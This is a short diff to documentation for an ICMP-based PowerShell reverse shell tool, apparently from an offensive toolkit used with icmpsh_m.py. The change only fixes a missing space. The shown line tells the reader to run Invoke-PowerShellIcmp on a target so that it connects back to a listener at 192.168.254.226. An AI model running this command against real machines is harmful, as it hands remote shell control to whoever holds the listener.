@@ -27,7 +27,7 @@ icmpsh_m.py is a part of the icmpsh tools.
 
 On the target, run the below command.
 
-PS > Invoke-PowerShellIcmp-IPAddress 192.168.254.226
+PS > Invoke-PowerShellIcmp -IPAddress 192.168.254.226
 
 Above shows an example of an interactive PowerShell reverse connect shell. 
 
